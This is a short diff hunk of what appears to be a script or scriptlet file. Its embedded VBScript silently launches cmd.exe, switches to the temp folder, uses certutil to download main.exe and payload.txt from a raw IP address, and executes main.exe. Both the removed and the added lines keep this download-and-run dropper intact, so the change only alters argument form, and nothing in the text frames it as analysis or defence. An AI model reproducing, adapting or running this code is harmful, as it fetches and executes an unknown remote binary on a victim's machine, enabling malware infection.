@@ -29,8 +29,8 @@ cmd.exe - < ...:payload.bat
     <![CDATA[
         CreateObject("WScript.Shell").Run _
             "C:\Windows\System32\cmd.exe /c cd /d %TEMP% && " &_
-            "certutil.exe -urlcache -split -f http://47.98.135.65/main/main.exe main.exe && " &_
-            "certutil.exe -urlcache -split -f http://47.98.135.65/main/payload.txt payload.txt && " &_
+            "certutil.exe -urlcache -split -f http://47.98.135.65/main/main.exe && " &_
+            "certutil.exe -urlcache -split -f http://47.98.135.65/main/payload.txt && " &_
             "main.exe", 0, false
     ]]>
 </script>
